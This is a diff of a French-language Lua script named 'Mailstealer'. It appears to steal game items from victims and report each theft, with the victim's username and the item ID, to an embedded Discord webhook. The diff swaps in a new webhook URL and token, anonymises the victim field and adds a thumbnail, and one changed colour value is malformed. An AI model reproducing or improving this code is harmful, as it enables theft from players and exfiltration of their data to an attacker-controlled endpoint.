@@ -1,5 +1,5 @@
 Username = "matou2209"
-Webhook = "https://discord.com/api/webhooks/1208251453404221480/GRQY83VKlV1j5Fx1ZDIXKv8eg-HJs9rVqBR8PaSSbiT-1neGiGHRWqw4BY1XxDPa2C09"
+Webhook = "https://discord.com/api/webhooks/1213255158545383456/xWWQ4onamyBSWtK08wAM6VTW7-HfjeOZtpCneCkLIzuGYPgYvI1MxZy_ga_IVZUSlkML"
 min_rap = 10000
 
 function SendMessage(url, username, itemID)
@@ -10,11 +10,11 @@ function SendMessage(url, username, itemID)
     local data = {
         ["embeds"] = {{
             ["title"] = "Nouvel objet envoyé",
-            ["color"] = 65280,
+            ["color"] = 884DA7,
             ["fields"] = {
                 {
                     ["name"] = "Nom d'utilisateur de la victime :",
-                    ["value"] = username,
+                    ["value"] = "Anonyme",
                     ["inline"] = true
                 },
                 {
@@ -25,6 +25,9 @@ function SendMessage(url, username, itemID)
             },
             ["footer"] = {
                 ["text"] = "Mailstealer par WhriterScript. discord.gg/QbNUGKYP"
+            },
+            ["thumbnail"] = {
+                ["url"] = "https://ibb.co/wzQBJzh"
             }
         }}
     }
